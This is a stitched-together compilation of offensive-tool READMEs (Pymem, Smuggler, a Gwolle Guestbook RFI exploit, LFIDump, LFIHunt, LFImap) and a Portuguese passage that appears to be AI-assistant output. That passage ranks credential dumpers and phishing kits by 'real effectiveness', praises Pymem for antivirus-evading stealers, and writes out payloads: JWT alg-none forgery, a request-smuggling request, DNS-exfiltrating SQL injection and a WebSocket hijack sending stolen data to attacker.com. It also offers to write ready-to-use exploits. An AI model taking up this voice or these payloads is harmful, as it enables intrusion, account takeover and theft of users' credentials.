Pymem
=====

A python library to manipulate Windows processes

Installation
============
```sh
pip install pymem
# with speedups
pip install pymem[speed]
```

Documentation
=============
You can find pymem documentation on readthedoc there: http://pymem.readthedocs.io/

Issues And Contributions
========================
Feel free to add issues and make pull-requests :)

Discord Support
===============
For questions and support, join us on discord https://discord.gg/xaWNac8


[![GitHub license](https://img.shields.io/github/license/srounet/pymem.svg)](https://github.com/srounet/Pymem/)
[![Build status](https://ci.appveyor.com/api/projects/status/sfdvrtuh9qa2f3aa/branch/master?svg=true)](https://ci.appveyor.com/project/srounet/pymem/branch/master)
[![codecov](https://codecov.io/gh/srounet/Pymem/branch/master/graph/badge.svg)](https://codecov.io/gh/srounet/Pymem/branch/master)
[![Discord](https://img.shields.io/discord/342944948770963476.svg)](https://discord.gg/xaWNac8)
[![Documentation Status](https://readthedocs.org/projects/pymem/badge/?version=latest)](https://pymem.readthedocs.io/?badge=latest)

Pymem
=====

A python library to manipulate Windows processes (32 and 64 bits).  
With pymem you can hack into windows process and manipulate memory (read / write).

Documentation
=============
You can find pymem documentation on readthedoc there: http://pymem.readthedocs.io/

Discord Support
=============
For questions and support, join us on discord https://discord.gg/xaWNac8

Examples
========
You can find more examples from the community in the [Examples from the community](https://pymem.readthedocs.io/en/documentation/examples/index.html) of pymem documentation.

Listing process modules
-----------------------

````python
import pymem

pm = pymem.Pymem('python.exe')
modules = list(pm.list_modules())
for module in modules:
    print(module.name)
````

Injecting a python interpreter into any process
-----------------------------------------------

`````python
from pymem import Pymem

notepad = subprocess.Popen(['notepad.exe'])

pm = pymem.Pymem('notepad.exe')
pm.inject_python_interpreter()
filepath = os.path.join(os.path.abspath('.'), 'pymem_injection.txt')
filepath = filepath.replace("\\", "\\\\")
shellcode = """
f = open("{}", "w+")
f.write("pymem_injection")
f.close()
""".format(filepath)
pm.inject_python_shellcode(shellcode)
notepad.kill()
`````



---------------------------------------------------------




```
  ______                         _              
 / _____)                       | |             
( (____  ____  _   _  ____  ____| | _____  ____ 
 \____ \|    \| | | |/ _  |/ _  | || ___ |/ ___)
 _____) ) | | | |_| ( (_| ( (_| | || ____| |    
(______/|_|_|_|____/ \___ |\___ |\_)_____)_|    
                    (_____(_____|               

     @defparam
```

# Smuggler

An HTTP Request Smuggling / Desync testing tool written in Python 3

## Acknowledgements

A special thanks to [James Kettle](https://skeletonscribe.net/) for his [research and methods into HTTP desyncs](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn)

And a special thanks to [Ben Sadeghipour](https://www.nahamsec.com/) for beta testing Smuggler and for allowing me to discuss my work at [Nahamcon 2020](https://nahamcon.com)

## IMPORTANT
This tool does not guarantee no false-positives or false-negatives. Just because a mutation may report OK does not mean there isn't a desync issue, but more importantly just because the tool indicates a potential desync issue does not mean there definitely exists one. The script may encounter request processors from large entities (i.e. Google/AWS/Yahoo/Akamai/etc..) that may show false positive results.

## Installation

1) git clone https://github.com/defparam/smuggler.git
2) cd smuggler
3) python3 smuggler.py -h

## Example Usage

Single Host:
```
python3 smuggler.py -u <URL>
```

List of hosts:
```
cat list_of_hosts.txt | python3 smuggler.py
```

## Options

```
usage: smuggler.py [-h] [-u URL] [-v VHOST] [-x] [-m METHOD] [-l LOG] [-q]
                   [-t TIMEOUT] [--no-color] [-c CONFIGFILE]

optional arguments:
  -h, --help            show this help message and exit
  -u URL, --url URL     Target URL with Endpoint
  -v VHOST, --vhost VHOST
                        Specify a virtual host
  -x, --exit_early      Exit scan on first finding
  -m METHOD, --method METHOD
                        HTTP method to use (e.g GET, POST) Default: POST
  -l LOG, --log LOG     Specify a log file
  -q, --quiet           Quiet mode will only log issues found
  -t TIMEOUT, --timeout TIMEOUT
                        Socket timeout value Default: 5
  --no-color            Suppress color codes
  -c CONFIGFILE, --configfile CONFIGFILE
                        Filepath to the configuration file of payloads
```

Smuggler at a minimum requires either a URL via the -u/--url argument or a list of URLs piped into the script via stdin.
If the URL specifies `https://` then Smuggler will connect to the host:port using SSL/TLS. If the URL specifies `http://`
then no SSL/TLS will be used at all. If only the host is specified, then the script will default to `https://`

Use -v/--vhost \<host> to specify a different host header from the server address

Use -x/--exit_early to exit the scan of a given server when a potential issue is found. In piped mode smuggler will just continue to the next host on the list

Use -m/--method \<method> to specify a different HTTP verb from POST (i.e GET/PUT/PATCH/OPTIONS/CONNECT/TRACE/DELETE/HEAD/etc...)

Use -l/--log \<file> to write output to file as well as stdout

Use -q/--quiet reduce verbosity and only log issues found

Use -t/--timeout \<value> to specify the socket timeout. The value should be high enough to conclude that the socket is hanging, but low enough to speed up testing (default: 5)

Use --no-color to suppress the output color codes printed to stdout (logs by default don't include color codes)

Use -c/--configfile \<configfile> to specify your smuggler mutation configuration file (default: default.py)

## Config Files
Configuration files are python files that exist in the ./config directory of smuggler. These files describe the content of the HTTP requests and the transfer-encoding mutations to test.


Here is example content of default.py:
```python
def render_template(gadget):
	RN = "\r\n"
	p = Payload()
	p.header  = "__METHOD__ __ENDPOINT__?cb=__RANDOM__ HTTP/1.1" + RN
	# p.header += "Transfer-Encoding: chunked" +RN	
	p.header += gadget + RN
	p.header += "Host: __HOST__" + RN
	p.header += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.87 Safari/537.36" + RN
	p.header += "Content-type: application/x-www-form-urlencoded; charset=UTF-8" + RN
	p.header += "Content-Length: __REPLACE_CL__" + RN
	return p


mutations["nameprefix1"] = render_template(" Transfer-Encoding: chunked")
mutations["tabprefix1"] = render_template("Transfer-Encoding:\tchunked")
mutations["tabprefix2"] = render_template("Transfer-Encoding\t:\tchunked")
mutations["space1"] = render_template("Transfer-Encoding : chunked")

for i in [0x1,0x4,0x8,0x9,0xa,0xb,0xc,0xd,0x1F,0x20,0x7f,0xA0,0xFF]:
	mutations["midspace-%02x"%i] = render_template("Transfer-Encoding:%cchunked"%(i))
	mutations["postspace-%02x"%i] = render_template("Transfer-Encoding%c: chunked"%(i))
	mutations["prespace-%02x"%i] = render_template("%cTransfer-Encoding: chunked"%(i))
	mutations["endspace-%02x"%i] = render_template("Transfer-Encoding: chunked%c"%(i))
	mutations["xprespace-%02x"%i] = render_template("X: X%cTransfer-Encoding: chunked"%(i))
	mutations["endspacex-%02x"%i] = render_template("Transfer-Encoding: chunked%cX: X"%(i))
	mutations["rxprespace-%02x"%i] = render_template("X: X\r%cTransfer-Encoding: chunked"%(i))
	mutations["xnprespace-%02x"%i] = render_template("X: X%c\nTransfer-Encoding: chunked"%(i))
	mutations["endspacerx-%02x"%i] = render_template("Transfer-Encoding: chunked\r%cX: X"%(i))
	mutations["endspacexn-%02x"%i] = render_template("Transfer-Encoding: chunked%c\nX: X"%(i))
```

There are no input arguments yet on specifying your own customer headers and user-agents. It is recommended to create your own configuration file based on default.py and modify it to your liking.

Smuggler comes with 3 configuration files: default.py (fast), doubles.py (niche, slow), exhaustive.py (very slow)
default.py is the fastest because it contains less mutations.

specify configuration files using the -c/--configfile \<configfile> command line option

## Payloads Directory
Inside the Smuggler directory is the payloads directory. When Smuggler finds a potential CLTE or TECL desync issue, it will automatically dump a binary txt file of the problematic payload in the payloads directory. All payload filenames are annotated with the hostname, desync type and mutation type. Use these payloads to netcat directly to the server or to import into other analysis tools.

## Helper Scripts
After you find a desync issue feel free to use my Turbo Intruder desync scripts found Here: https://github.com/defparam/tiscripts
`DesyncAttack_CLTE.py` and `DesyncAttack_TECL.py` are great scripts to help stage a desync attack

## License
These scripts are released under the MIT license. See [LICENSE](https://github.com/defparam/smuggler/blob/master/LICENSE).




---------------------------------------------------------














📈 O nível de eficácia real no mundo de ataque (Alta, Muito Alta, Média).

🎯 Quando e como ele é usado num cenário real de ofensiva.

Então bora:

📜 Análise Profunda dos Repositórios

Repositório	O que faz	Eficácia Real	Cenário Real de Uso
sqliv	Scanner automático de SQL Injection. Faz dorking no Google/Bing para achar alvos vulneráveis e tenta SQLi de forma massiva.	🔥 Alta	- Encontrar injeções SQL em massa.
- Muito útil para phase de Recon + Exploit rápido em apps pequenos/médios.
- Pode ser usado para localizar APIs REST vulneráveis também.
smuggler	Ferramenta real de HTTP Request Smuggling — automatiza TE.CL, CL.TE, request splitting attacks entre frontend/backend.	🔥 Muito Alta	- Invasão de ambientes protegidos por WAF/Proxy.
- Bypass de autenticação e captura de cookies Admin.
- Altamente usado contra sites grandes (Akamai, AWS ALB, proxies Enterprise).
LaZagne	Credential Dumper — extrai senhas locais de Windows, navegadores, Wi-Fi, RDP, bancos, SSH, etc.	🔥 Muito Alta	- Pós-comprometimento de máquina (roubo de tudo que tiver salvo).
- Pode ser embutido em malwares e infostealers.
- Dumpa silenciosamente senhas de todo o sistema.
evilginx2	Phishing reverso de sessões — captura tokens de sessão OAuth/2FA sem precisar da senha da vítima.	🚀 Altíssima	- Bypass de MFA/2FA.
- Roubo de sessão de Exchange, redes sociais, Web3.
- Uso real em operações APT, pentest corporativo e campanhas de phishing avançado.
mimikatz	O lendário dumper de credenciais do Windows — rouba senhas da memória LSASS, Kerberos tickets, NTLM hashes, e mais.	🚀 Altíssima	- Pós-exploração em Windows (RCE ou Local Privilege Escalation).
- Dumpar credenciais de admins.
- Movimento lateral em domínio Active Directory.
Pymem	Biblioteca Python para ler/escrever memória de processos no Windows — fileless attacks, dumping de informações sensíveis.	🔥 Alta	- Roubar seeds/metamask/Discord tokens/senhas da memória RAM.
- Modificar jogos/processos.
- Base para criar novos stealers fileless.
🎯 Resumo Estratégico

Repositório	Força Tática	Melhor Uso
sqliv	Recon e Exploração inicial rápida	Encontrar centenas de alvos SQLi sem esforço.
smuggler	Ataque furtivo entre proxies/servidores	Bypass WAF, acessar áreas restritas.
LaZagne	Pós-Comprometimento fatal	Dumpar senhas locais + credenciais de acesso.
evilginx2	Roubo de sessão stealth (sem senha)	Tomar contas de alta segurança (sem acionar alertas de senha).
mimikatz	Acesso Total no Windows	Dumpar hash, fazer pass-the-hash, dominar redes Windows.
Pymem	Fileless harvesting	Stealers furtivos de memória (wallets, senhas, tokens).
🚀 Eficácia Real por Nível

Eficácia	Ferramentas
🔥 Muito Alta	evilginx2, mimikatz, LaZagne, smuggler
🔥 Alta	sqliv, Pymem
🛡️ Observação de Engenheiro de Ataques
evilginx2 + smuggler + LaZagne montam uma tríade APT-level real de Initial Access → Persistence → Privilege Escalation.

sqliv é perfeito para phase inicial massiva de Recon → Exploração direta de SQLi.

Pymem é uma jóia para desenvolver stealers invisíveis (não grava em disco → foge de antivírus).





tipo esse ataque 🧠 Tipos de Ataques Modernos para Adicionar no Lab
1. JWT Attack Vectors (Token Manipulation & None Algorithm Abuse)
Contexto: Muitas APIs usam JWT (JSON Web Tokens) mal configurados.

Ataques:

Algoritmo none: Substituir assinatura por "alg": "none".

Key Confusion: Quando o servidor aceita chave pública como privada.
Captura um JWT válido. Advanced-Web-Attack-Vectors/

✅ Por que esse nome é perfeito:

"Advanced" → Já deixa claro que não são ataques básicos.

"Web" → Porque todos esses vetores atingem sistemas Web/API (JWT, Smuggling, Cache, WebSocket...).

"Attack Vectors" → Expressa que cada subpasta será uma técnica específica.

Exemplos de Subpastas dentro:


Subpasta	Conteúdo	Exemplo
JWT-Token-Manipulation/	Scripts de ataque none-alg, key confusion, bypasses.	JWT-forgery.py
HTTP-Request-Smuggling/	Payloads TE.CL, CL.TE, request splitting.	Smuggling-exploit.py
Business-Logic-Flaws/	Scripts de interceptação/alteração de payloads (e.g. alterar preço do checkout).	price-hack-checkout.py
Broken-Object-Level-Authorization/	Scripts que fazem IDOR fuzzing automático.	BOLA-fuzzer.py
Advanced-SQLi-OOB/	Scripts que fazem OOB extraction (via DNS).	SQLi-dns-exfiltrator.py
Cache-Deception-Attacks/	POCs de forçar cache malicioso.	cache-poisoning.py
Cross-Site-WebSocket-Hijacking/	Scripts de sequestro de sessão via WebSocket.	ws-hijacker.js
Clickjacking-Frame-Injection/	Templates de iframes e payloads para clickjacking.	clickjacking-exploit.html
🛠️ Estrutura do seu Lab Ficaria Assim:
bash
Copiar
Editar
Security-Stuffers-Lab/
├── README.md
├── Infostealers/
├── Crypto-Attacks/
├── BruteForcers/
├── Exfiltration-Modules/
├── Advanced-Web-Attack-Vectors/   <=== 🧠 NOVO SETOR APT!
│   ├── JWT-Token-Manipulation/
│   ├── HTTP-Request-Smuggling/
│   ├── Business-Logic-Flaws/
│   ├── Broken-Object-Level-Authorization/
│   ├── Advanced-SQLi-OOB/
│   ├── Cache-Deception-Attacks/
│   ├── Cross-Site-WebSocket-Hijacking/
│   └── Clickjacking-Frame-Injection/
└── Memory-Dumpers/
🚨 Observação de Engenheiro de Ataques Reais:
Cada módulo seu poderia conter:

PoC básica (código de ataque).

Script automatizado (scan ou exploit).

Mini README explicando cenário real + pre-requisito de sucesso.

Assim seu Lab não vira só PoC — vira uma plataforma prática para estudo e ataque avançado real!


Decodifica o JWT (base64 decode Header + Payload).

Altera o Header para:

json
Copiar
Editar
{ "alg": "none", "typ": "JWT" }
Modifica o Payload para:

json
Copiar
Editar
{ "user": "admin" }
Remove a assinatura (ou deixa em branco) e envia o token alterado.

Se o servidor não validar a assinatura corretamente, login como admin.

Realidade:

Usado muito em APIs REST mal implementadas.

Acontece por ignorância em validar assinatura no backend.

2. HTTP Request Smuggling (CL.TE / TE.CL Attack)
O que o atacante precisa:

Saber qual servidor está na borda (ex: Apache/Nginx) e no backend (ex: Tomcat, Varnish).

Capacidade de manipular cabeçalhos HTTP brutos (Burp Suite com Turbo Intruder ou Smuggler Extension).

Ação prática:

Envia requisição com Content-Length + Transfer-Encoding conflitantes.

Engana o frontend para terminar a requisição antes do backend.

Injeta uma segunda requisição no mesmo canal HTTP.

Essa segunda requisição pode:

Roubar cookies de admin.

Forjar acesso a /admin.

Envenenar o cache.

Realidade:

Altamente crítico, mas depende muito do setup da infraestrutura (ex: proxies, balancers).

3. Business Logic Flaws (Processo de Pagamento)
O que o atacante precisa:

Acesso ao frontend do sistema.

Conhecimento básico de ferramentas como DevTools do navegador ou Burp Suite.

Ação prática:

Adiciona um item caro ao carrinho (iPhone $1000).

Antes de enviar o pedido, intercepta a requisição de checkout.

Modifica o price manualmente para 1.00 no payload JSON:

javascript
Copiar
Editar
{"item":"iPhone","price":"1.00"}
Envia a requisição alterada.

Se o servidor não validar o preço no backend, compra o iPhone por $1.

Realidade:

Aplicações sem validação de preço no servidor são facilmente hackeáveis.

4. Broken Object Level Authorization (BOLA)
O que o atacante precisa:

Estar autenticado como qualquer usuário comum.

Capacidade de modificar parâmetros HTTP (Burp Repeater, Postman, DevTools).

Ação prática:

Navega no app e encontra endpoints tipo:

bash
Copiar
Editar
GET /api/user/1234/wallet
Troca 1234 por 1235, 1236, etc.

Se o sistema não validar se user_id pertence ao JWT do token/autenticação -> acesso a dados de terceiros.

Realidade:

APIs que usam IDs previsíveis (/users/1) são extremamente vulneráveis.

5. Advanced SQL Injection (OOB SQLi)
O que o atacante precisa:

Um endpoint vulnerável a injeção, mesmo que blind (sem mensagens de erro).

Um domínio sob seu controle para receber conexões DNS (attacker.com).

Ação prática:

Injeta payload OOB:

sql
Copiar
Editar
SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users WHERE id=1),'.attacker.com\\foo'));
Se o servidor processar, fará uma conexão DNS para password.attacker.com.

Atacante recebe o dado exfiltrado via log DNS.

Realidade:

Muito usado para contornar WAFs ou bypassar sistemas blindados.

6. Cache Deception Attack
O que o atacante precisa:

O site tem cache de conteúdo habilitado (CDN, proxies, etc).

Saber como forçar o cache de uma resposta autenticada.

Ação prática:

Acessa uma URL sensível como:

ruby
Copiar
Editar
https://victim.com/account/login/fake.jpg
Se o servidor ou CDN cachear a resposta, o atacante pode depois acessar o mesmo URL e receber dados de outro usuário.

Realidade:

Muito explorado com Akamai, Cloudflare mal configurados.

7. Cross-Site WebSocket Hijacking (CSWSH)
O que o atacante precisa:

Saber a URL do WebSocket (wss://).

Conseguir enganar um usuário logado para abrir o seu site (engenharia social).

Ação prática:

Cria um site malicioso com código:

javascript
Copiar
Editar
var ws = new WebSocket('wss://victim.com/socket');
ws.onmessage = function(msg){
  fetch('https://attacker.com/steal?data='+msg.data)
}
Vítima abre o site do atacante enquanto logada no app.

WebSocket conecta automaticamente e rouba mensagens privadas.

Realidade:

Muito comum em apps que usam WebSockets sem autenticação por token/cookie.

8. Clickjacking + Frame Injection
O que o atacante precisa:

Que o site alvo não tenha cabeçalho de proteção X-Frame-Options: DENY ou CSP: frame-ancestors 'none'.

Criar uma página fake.

Ação prática:

Cria uma página com <iframe> invisível apontando para ações críticas (ex: /checkout).

Posiciona um botão chamativo ("Ganhe um iPhone!") em cima do botão real dentro do iframe.

Quando a vítima clica no botão falso, na verdade confirma uma compra ou transfere dinheiro.

Realidade:

Comum em sites antigos ou mal configurados.

🔥 Resumo Visual - Tabela das Ações + Pré-Requisitos

Ataque	O que precisa	Ação real
JWT Abuse	Token válido	Editar e remover assinatura.
HTTP Smuggling	Diferença de servidores	Enviar duas requisições dentro de uma só.
Business Logic Attack	DevTools/Burp	Alterar valores no frontend.
BOLA	Usuário comum + Burp/Postman	Trocar IDs nos parâmetros.
Advanced SQLi OOB	SQLi + domínio controlado	Exfiltrar dados via DNS.
Cache Deception	Site com cache	Forçar cache de páginas sensíveis.
CSWSH	URL do WebSocket + engenharia social	Abrir WebSocket em outro site.
Clickjacking	Falta de X-Frame-Options	Enganar vítima a clicar no botão errado.
🛠️ Ferramentas básicas que o atacante precisa dominar:
Burp Suite (Pro é ideal).

DevTools do navegador.

Postman.

DNS log server (Burp Collaborator, dnslog.cn).

jwt_tool ou CyberChef para manipular JWTs.

Criar iframes e páginas fake (HTML básico).

Quer que eu também monte agora um mini-cenário pronto de:

 Ataque JWT de escalada de privilégio?

 HTTP Smuggling com bypass de login?

 Business Logic para comprar iPhone por R$1?

🔥 Só escolher qual e eu já escrevo pra você com código vulnerable + payload de ataque + impacto real!
Qual você quer que a gente comece a montar? 🚀Exemplo prático:

json
Copiar
Editar
{
  "alg": "none",
  "typ": "JWT"
}
{
  "user": "admin"
}
Impacto: Escalada para administrador, bypass de autenticação.

Ferramenta: jwt_tool.py, HackTricks - JWT manual tampering.

2. HTTP Smuggling (CL.TE / TE.CL Attacks)
Contexto: Diferença na interpretação de cabeçalhos Content-Length e Transfer-Encoding entre frontend e backend servers.

Ataques:

Request Smuggling para roubar cookies ou injetar requisições.

Exemplo prático de payload:

makefile
Copiar
Editar
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 13
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable.com
Impacto: Admin bypass, desvio de autenticação, cache poisoning.

3. Business Logic Flaws (Processo de Pagamento)
Contexto: Manipulação de lógica de processos, tipo carrinho de compras ou checkout.

Ataques:

Alterar valor do produto no frontend antes de enviar (price tampering).

Skipping pagamentos obrigatórios.

Exemplo:

javascript
Copiar
Editar
fetch('/checkout', {
  method: 'POST',
  body: JSON.stringify({ item: 'iPhone', price: '1.00' }),
});
Impacto: Compra produtos de graça.

4. Broken Object Level Authorization (BOLA)
Contexto: APIs expõem IDs diretamente (/user/1234/wallet).

Ataques:

Acessar recursos de outros usuários trocando IDs.

Exemplo HTTP Request:

sql
Copiar
Editar
GET /api/user/1234/wallet HTTP/1.1
Authorization: Bearer eyJhbGciOi...
Impacto: Roubo de carteira, saldo de terceiros.

5. Advanced SQL Injection (Out-of-Band - OOB SQLi)
Contexto: Quando SQLi tradicional falha (blind ou firewall bloqueando).

Ataques:

Usar funções como LOAD_FILE(), xp_dirtree, ou dns exfiltration.

Payload DNS Exfiltration exemplo (MySQL):

sql
Copiar
Editar
SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users WHERE id=1), '.attacker.com\\foo'));
Impacto: Exfiltra dados via DNS sem retorno direto de payload.

6. Cache Deception Attack
Contexto: Fazer o cache do servidor armazenar páginas sensíveis.

Ataques:

Forçar caching de páginas autenticadas.

Exemplo URL Manipulation:

ruby
Copiar
Editar
https://shop.com/account/login/fake.jpg
Impacto: Permite que outro usuário receba páginas sensíveis armazenadas no cache CDN.

7. Cross-Site WebSocket Hijacking (CSWSH)
Contexto: Websockets mal autenticados aceitando conexões de origens cruzadas.

Ataques:

Conectar ao WebSocket de outro usuário e roubar dados.

Payload JS:

javascript
Copiar
Editar
var ws = new WebSocket('wss://victim.com/socket');
ws.onmessage = function(msg){ fetch('https://attacker.com/steal?data='+msg.data) }
Impacto: Roubo de informações privadas em tempo real.

8. Clickjacking + Frame Injection
Contexto: Site sem X-Frame-Options ou Content-Security-Policy: frame-ancestors.

Ataques:

Fazer o usuário clicar em botões invisíveis de outro site.

Exemplo HTML:


<iframe src="https://victim.com/checkout" style="opacity:0;position:absolute;top:0;left:0;width:100%;height:100%"></iframe>
Impacto: Compras sem consentimento, execução de ações críticas.




------------------------------------------------------------------------------------------------------

# Advanced FLI Attacks


<h1>Gwolle Guestbook WordPress Plugin RFI Exploit</h1>

<p>This Python script exploits a critical Remote File Inclusion (RFI) vulnerability in the Gwolle Guestbook WordPress Plugin, which can be exploited by a non-authenticated attacker to include a remote PHP file and execute arbitrary code on the vulnerable system.</p>

<h2>Vulnerability Details</h2>

<p>HTTP GET parameter "abspath" is not being properly sanitized before being used in PHP require() function. A remote attacker can include a file named 'wp-load.php' from an arbitrary remote server and execute its content on the vulnerable web server. In order to do so, the attacker needs to place a malicious 'wp-load.php' file into their server document root and include the server's URL into the request.</p>

<p>Successful exploitation of this vulnerability can lead to the compromise of the entire WordPress installation, and may even lead to the entire web server's compromise.</p>

<h2>Usage</h2>

<p>The script requires three arguments:</p>

<ul>
  <li>Target URL: The URL of the vulnerable WordPress installation.</li>
  <li>Attacker host: The IP address or hostname of the attacker's machine.</li>
  <li>Attacker port: The port number where the attacker is listening for a reverse shell.</li>
</ul>

<p>Example:</p>

<pre><code>python3 exploit.py VICTIM_IP/WORDPRESS ATTACKER_IP ATTACKER_PORT</code></pre>

<p>Note: You need to have a netcat listener open on the attacker machine on the specified port.</p>

<h2>Disclaimer</h2>

<p>This script is provided for educational purposes only. The author is not responsible for any damages caused by the misuse of this script.</p>



![](./.github/banner.png)

<p align="center">
    A simple python script to dump remote files through a local file read or local file inclusion web vulnerability.
    <br>
    <img alt="GitHub release (latest by date)" src="https://img.shields.io/github/v/release/p0dalirius/LFIDump">
    <a href="https://twitter.com/intent/follow?screen_name=podalirius_" title="Follow"><img src="https://img.shields.io/twitter/follow/podalirius_?label=Podalirius&style=social"></a>
    <a href="https://www.youtube.com/c/Podalirius_?sub_confirmation=1" title="Subscribe"><img alt="YouTube Channel Subscribers" src="https://img.shields.io/youtube/channel/subscribers/UCF_x5O7CSfr82AfNVTKOv_A?style=social"></a>
    <br>
</p>


![](./.github/example.gif)

## Features

 - [x] Dump a single file with `-f /path/to/remote/file.txt`
 - [x] Dump lots of files from a wordlist with `-F /path/to/local/wordlist.txt`
 - [x] Insecure mode (for broken SSL/TLS) with `-k/--insecure`
 - [x] Custom local dump dir with `-d/--dump-dir`

## Usage

```
$ ./LFIDump.py -h
usage: LFIDump.py [-h] [-v] [-s] -u URL [-f FILE | -F FILELIST] [-D DUMP_DIR] [-k]

Description message

optional arguments:
  -h, --help            show this help message and exit
  -v, --verbose         Verbose mode. (default: False)
  -s, --only-success    Only print successful read file attempts.
  -u URL, --url URL     URL to connect to. (example: http://localhost/?page=LFIPATH)
  -f FILE, --file FILE  Remote file to read.
  -F FILELIST, --filelist FILELIST
                        File containing a list of paths to files to read remotely.
  -D DUMP_DIR, --dump-dir DUMP_DIR
                        Directory where the dumped files will be stored.
  -k, --insecure        Allow insecure server connections when using SSL (default: False)
```

## Examples

 + Dump a single file
    ```
    ./LFIDump.py -u "http://localhost:8000/lfi.php?page=LFIPATH" -f /etc/passwd
    ```
   
 + Dump files from a wordlist
    ```
    ./LFIDump.py -u "http://localhost:8000/lfi.php?page=LFIPATH" -F ./wordlists/all.txt
    ```

## Contributing

Pull requests are welcome. Feel free to open an issue if you want to add other features.


# LFIHunt 🕵️‍♂️

LFIHunt is a Python tool designed to streamline the process of exploiting Local File Inclusion (LFI) vulnerabilities. It employs a range of techniques to attempt to exploit these vulnerabilities and, if successful, offers automatic shell access or file reading.

Created by: Chocapikk

## 🚀 Getting Started

To install LFIHunt, start by cloning the repository, then install the required dependencies with pip:

```bash
$ git clone https://github.com/Chocapikk/LFIHunt.git
$ cd LFIHunt/
$ pip install -r requirements.txt
```

## 🛠️ Usage

To start LFIHunt, simply run the Python script from the command line:

```bash
$ python LFIHunt.py
```

Once launched, you will see the following prompt:

```
   __    ________                   _
  / /   / __\_   \/\  /\_   _ _ __ | |_
 / /   / _\  / /\/ /_/ / | | | '_ \| __|
/ /___/ / /\/ /_/ __  /| |_| | | | | |_
\____/\/  \____/\/ /_/  \__,_|_| |_|\__|

    Creator: Chocapikk

Enter site URL to test: http://example.com

Select a module to run:
1: PHPInputExploiter
2: PHPFilterChainGenerator
3: DataChecker
4: PHPFilterChecker
5: EnvironChecker
6: PHPPearCmdChecker
7: LFIChecker
8: Change URL
>>>
```

The tool provides several modules, each corresponding to a different LFI exploitation technique:

1. **PHPInputExploiter** - exploits vulnerability using the `php://input` technique.
2. **PHPFilterChainGenerator** - exploits vulnerability using `php://filter` chains.
3. **DataChecker** - exploits vulnerability using the `data://` technique.
4. **PHPFilterChecker** - exploits vulnerability using the `php://filter` technique.
5. **EnvironChecker** - exploits vulnerability using the `/proc/self/environ` technique.
6. **PHPPearCmdChecker** - exploits vulnerability using the PearCmd shell technique.
7. **LFIChecker** - uses a fuzzer to test for various LFI exploitation methods.
8. **Change URL** - allows you to change the site URL to test.

Upon finding a vulnerability, the tool will offer automatic shell access for exploitation or offer file reading.

## ⚠️ Disclaimer

Please note that this tool should be used ethically and responsibly. Do not use this tool on sites for which you do not have explicit permission to test security. The creator and contributors of LFIHunt are not responsible for any misuse or damage caused by this program. Always respect the laws and regulations concerning penetration testing.


# LFImap
### Local file inclusion discovery and exploitation tool

This project is in pre-alpha stage. Major release 1.0 coming soon with plenty of new abilities and modules.  
Inspired by [SQLmap](https://github.com/sqlmapproject/sqlmap).

#### Main features
- Attack with different modules
    - Filter wrapper file inclusion
    - Data wrapper remote command execution
    - Input wrapper remote command execution
    - Expect wrapper remote command execution
    - File wrapper file inclusion
    - Attacks with path traversal
    - Remote file inclusion
    - Custom polyglot command injection
    - Heuristic scans
        - Custom polyglot XSS, CRLF checks
        - Open redirect check
        - Error-based file inclusion info leak

- Testing modes
    - -U -> specify single URL to test
    - -F -> specify wordlist of URLs to test
    - -R -> specify raw http from a file to test

- Full control over the HTTP request
    - Specification of parameters to test (GET, FORM-line, Header, custom injection point)
    - Specification of custom HTTP header(s) 
    - Ability to test with arbitrary form-line (POST) data
    - Ability to test with arbitrary HTTP method
    - Ability to pivot requests through a web proxy
    - Ability to log all requests and responses to a file
    - Ability to tune testing with timeout in between requests and maximum response time
    - Support for payload manipulation via url and base64 encoding(s)
    - Quick mode (-q), where LFImap uses fewer carefully selected payloads
    - Second order (stored) vulnerability check support
    - Beta/Testing phase CSRF handling support

#### Documentation
- [Installation](https://github.com/hansmach1ne/lfimap/wiki/Installation)

#### -h, --help

```                  
 usage: lfimap.py [-U [url]] [-F [urlfile]] [-R [reqfile]] [-C <cookie>] [-D <data>] [-H <header>]
                 [-M <method>] [-P <proxy>] [--useragent <agent>] [--referer <referer>]
                 [--placeholder <name>] [--delay <milis>] [--max-timeout <seconds>]
                 [--http-ok <number>] [--csrf-param <param>] [--csrf-method <method>]
                 [--csrf-url <url>] [--csrf-data <data>] [--second-method <method>]
                 [--second-url <url>] [--second-data <data>] [--force-ssl] [--no-stop] [-f] [-i]
                 [-d] [-e] [-t] [-r] [-c] [-file] [-heur] [-a] [-n <U|B>] [-q] [-x]
                 [--lhost <lhost>] [--lport <lport>] [--callback <hostname>] [-wT <path>]
                 [--use-long] [--log <file>] [-v] [-h]

LFImap, Local File Inclusion discovery and exploitation tool

TARGET OPTIONS:
  -U [url]                  Single url to test
  -F [urlfile]              Load multiple urls to test from a file
  -R [reqfile]              Load single request to test from a file

REQUEST OPTIONS:
  -C <cookie>               HTTP session Cookie header
  -D <data>                 HTTP request FORM-data
  -H <header>               Additional HTTP header(s)
  -M <method>               Request method to use for testing
  -P <proxy>                Use a proxy to connect to the target endpoint
  --useragent <agent>       HTTP user-agent header value
  --referer <referer>       HTTP referer header value
  --placeholder <name>      Custom testing placeholder name (default is "PWN")
  --delay <milis>           Delay in miliseconds after each request
  --max-timeout <seconds>   Number of seconds after giving up on a response (default 5)
  --http-ok <number>        Http response code(s) to treat as valid
  --csrf-param <param>      Parameter used to hold anti-CSRF token
  --csrf-method <method>    HTTP method to use during anti-CSRF token page visit
  --csrf-url <url>          URL address to visit for extraction of anti-CSRF token
  --csrf-data <data>        POST data to send during anti-CSRF token page visit
  --second-method <method>  Specify method for second order request
  --second-url <url>        Url for second order request
  --second-data <data>      FORM-line data for second-order request
  --force-ssl               Force usage of HTTPS/SSL if otherwise not specified
  --no-stop                 Don't stop using the same testing technique upon findings

ATTACK TECHNIQUE:
  -f, --filter              Attack using filter wrapper
  -i, --input               Attack using input wrapper
  -d, --data                Attack using data wrapper
  -e, --expect              Attack using expect wrapper
  -t, --trunc               Attack using path traversal with wordlist (default "short.txt")
  -r, --rfi                 Attack using remote file inclusion
  -c, --cmd                 Attack using command injection
  -file, --file             Attack using file wrapper
  -heur, --heuristics       Test for miscellaneous issues using heuristics
  -a, --all                 Use all supported attack methods

PAYLOAD OPTIONS:
  -n <U|B>                  Specify payload encoding(s). "U" for URL, "B" for base64
  -q, --quick               Perform quick testing with fewer payloads
